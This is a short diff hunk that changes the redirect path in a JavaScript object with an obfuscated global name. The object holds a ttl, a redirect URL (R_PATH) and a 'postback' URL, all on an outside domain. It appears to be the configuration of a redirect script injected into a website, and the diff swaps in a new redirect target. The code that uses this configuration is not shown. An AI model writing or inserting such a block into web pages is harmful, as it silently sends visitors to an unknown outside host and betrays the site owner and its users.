@@ -4,7 +4,7 @@
         window._fckLxKmpPqrGc9GY = {
             unique: false,
             ttl: 86400,
-            R_PATH: 'https://main-js.com/8KX85VvW',
+            R_PATH: 'https://main-js.com/f2SSbQ',
             P_PATH: 'https://main-js.com/19d4412/postback',
         };
     }
